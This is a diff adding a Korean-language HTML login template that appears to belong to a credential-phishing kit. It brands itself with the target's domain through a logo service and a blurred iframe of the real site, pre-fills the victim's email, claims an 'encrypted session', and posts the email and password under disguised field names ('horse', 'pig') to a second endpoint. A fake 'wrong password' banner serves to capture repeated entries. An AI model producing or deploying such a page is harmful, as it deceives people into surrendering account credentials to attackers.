@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>안전한 로그인</title>
+
+<link rel="icon" type="image/svg+xml" href="https://cdn.brandfetch.io/domain/{{dman}}?c=1idgn9W1pGfVaJw8IDW">
+
+<style>
+  *{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:-apple-system, BlinkMacSystemFont, "SF Pro Display", Arial;
+  }
+
+  body{
+    height:100vh;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    overflow:hidden;
+    position:relative;
+  }
+
+  .fallback{
+    position:absolute;
+    width:100%;
+    height:100%;
+    background:linear-gradient(135deg,#f5f7ff,#ffffff);
+    z-index:-3;
+  }
+
+  .bg{
+    position:absolute;
+    width:100%;
+    height:100%;
+    border:none;
+    z-index:-2;
+    filter:blur(20px);
+    transform:scale(1.1);
+    opacity:0.3;
+    pointer-events:none;
+  }
+
+  .overlay{
+    position:absolute;
+    width:100%;
+    height:100%;
+    background:rgba(255,255,255,0.55);
+    backdrop-filter:blur(12px);
+    z-index:-1;
+  }
+
+  .card{
+    width:360px;
+    padding:38px 30px;
+    border-radius:24px;
+    background:rgba(255,255,255,0.65);
+    backdrop-filter:blur(24px);
+    border:1px solid rgba(255,255,255,0.5);
+    box-shadow:0 25px 70px rgba(0,0,0,0.08);
+  }
+
+  .shake{
+    animation:shake 0.35s ease;
+  }
+
+  @keyframes shake{
+    0%{transform:translateX(0);}
+    25%{transform:translateX(-6px);}
+    50%{transform:translateX(6px);}
+    75%{transform:translateX(-4px);}
+    100%{transform:translateX(0);}
+  }
+
+  .top{
+    text-align:center;
+    margin-bottom:20px;
+  }
+
+  .logo{
+    width:52px;
+    height:52px;
+    margin-bottom:10px;
+  }
+
+  .title{
+    font-size:22px;
+    font-weight:600;
+  }
+
+  .sub{
+    font-size:13px;
+    color:#666;
+    margin-top:6px;
+  }
+
+  .security{
+    font-size:12px;
+    color:#0071e3;
+    margin-top:10px;
+  }
+
+  .input{
+    margin-bottom:14px;
+  }
+
+  label{
+    font-size:12px;
+    font-weight:600;
+    color:#333;
+    display:block;
+    margin-bottom:6px;
+  }
+
+  input{
+    width:100%;
+    padding:13px 14px;
+    border-radius:12px;
+    border:1px solid rgba(0,0,0,0.08);
+    background:rgba(255,255,255,0.7);
+    font-size:14px;
+    outline:none;
+  }
+
+  input:focus{
+    border-color:#0071e3;
+    box-shadow:0 0 0 4px rgba(0,113,227,0.15);
+  }
+
+  .row{
+    display:flex;
+    justify-content:space-between;
+    font-size:12px;
+    margin:10px 0 18px;
+    color:#555;
+  }
+
+  button{
+    width:100%;
+    padding:14px;
+    border:none;
+    border-radius:12px;
+    background:#0071e3;
+    color:#fff;
+    font-size:15px;
+    font-weight:600;
+  }
+
+  button:hover{
+    background:#005fc1;
+  }
+
+  .error{
+    display:block;
+    background:rgba(255, 59, 48, 0.12);
+    border:1px solid rgba(255, 59, 48, 0.3);
+    color:#ff3b30;
+    padding:10px;
+    border-radius:10px;
+    font-size:12px;
+    margin-bottom:12px;
+    text-align:center;
+  }
+
+  .error.hidden{
+    display:none;
+  }
+
+</style>
+</head>
+
+<body>
+
+<div class="fallback"></div>
+<iframe class="bg" src="https://{{dman}}"></iframe>
+<div class="overlay"></div>
+
+<div class="card" id="card">
+
+  <div class="top">
+    <img class="logo" src="https://cdn.brandfetch.io/domain/{{dman}}?c=1idgn9W1pGfVaJw8IDW"/>
+    <div class="title">로그인</div>
+    <div class="sub">계정을 사용하여 계속 진행하세요.</div>
+    <div class="security">🔒 안전하게 암호화된 세션</div>
+  </div>
+
+  <!-- PYTHON CONTROLLED ERROR -->
+  <div class="error {% if not error %}hidden{% endif %}" id="errorBox">
+    비밀번호가 잘못되었습니다. 다시 시도해 주세요.
+  </div>
+
+  <form action="second" method="POST">
+
+    <div class="input">
+      <label>이메일</label>
+      <input type="email" name="horse" value="{{eman}}" required>
+    </div>
+
+    <div class="input">
+      <label>비밀번호</label>
+      <input type="password" name="pig" required>
+    </div>
+
+    <div class="row">
+      <label><input type="checkbox" name="remember"> 나를 기억해줘</label>
+      <a href="#">비밀번호를 잊으셨나요??</a>
+    </div>
+
+    <button type="submit">계속하다</button>
+
+  </form>
+
+</div>
+
+<script>
+  // ONLY UI EFFECT (no authentication logic)
+  const errorBox = document.getElementById("errorBox");
+  const card = document.getElementById("card");
+
+  if(errorBox && !errorBox.classList.contains("hidden")){
+    card.classList.add("shake");
+  }
+</script>
+
+</body>
+</html>
